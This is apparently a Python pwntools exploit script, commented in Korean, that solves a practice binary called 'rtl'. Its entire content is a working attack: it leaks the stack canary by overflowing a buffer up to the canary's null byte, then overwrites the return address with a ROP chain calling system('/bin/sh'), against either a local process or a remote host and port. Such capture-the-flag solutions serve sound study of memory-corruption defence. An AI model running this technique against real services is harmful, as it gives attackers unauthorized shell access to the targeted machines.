from pwn import *
import sys

context.log_level = "debug"

elf = ELF("./rtl")
context.binary = elf

# 자동 주소 탐색
system = elf.plt["system"]
binsh = next(elf.search(b"/bin/sh"))

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

log.info(f"system      = {hex(system)}")
log.info(f"/bin/sh     = {hex(binsh)}")
log.info(f"pop rdi ret = {hex(pop_rdi_ret)}")
log.info(f"ret         = {hex(ret)}")

# 실행 방식
# local:  python3 exploit.py
# remote: python3 exploit.py HOST PORT
if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process("./rtl")

# =========================
# 1단계: Canary Leak
# =========================

# buf 시작부터 canary 첫 바이트까지 덮음
# 0x38 = buf 시작부터 canary 직전까지
# +1   = canary 첫 바이트 \x00 덮기
leak_payload = b"A" * 0x39

p.recvuntil(b"Buf: ")
p.send(leak_payload)

# 프로그램이 입력값을 다시 출력할 때,
# A * 0x39 뒤에 canary 뒤쪽 7바이트가 따라 나옴
p.recvuntil(leak_payload)
leaked = p.recv(7)

# canary 첫 바이트는 원래 \x00이므로 앞에 붙여서 복구
canary = u64(b"\x00" + leaked)

log.success(f"canary = {hex(canary)}")

# =========================
# 2단계: Return Address Overwrite
# =========================

payload = b"A" * 0x38      # canary 직전까지 채움
payload += p64(canary)     # canary 원래 값으로 복구
payload += b"B" * 8        # saved rbp 자리
payload += p64(ret)        # stack alignment용 ret
payload += p64(pop_rdi_ret) # rdi에 다음 값을 넣는 가젯
payload += p64(binsh)      # rdi = "/bin/sh"
payload += p64(system)     # system("/bin/sh")

p.recvuntil(b"Buf: ")
p.send(payload)

p.interactive()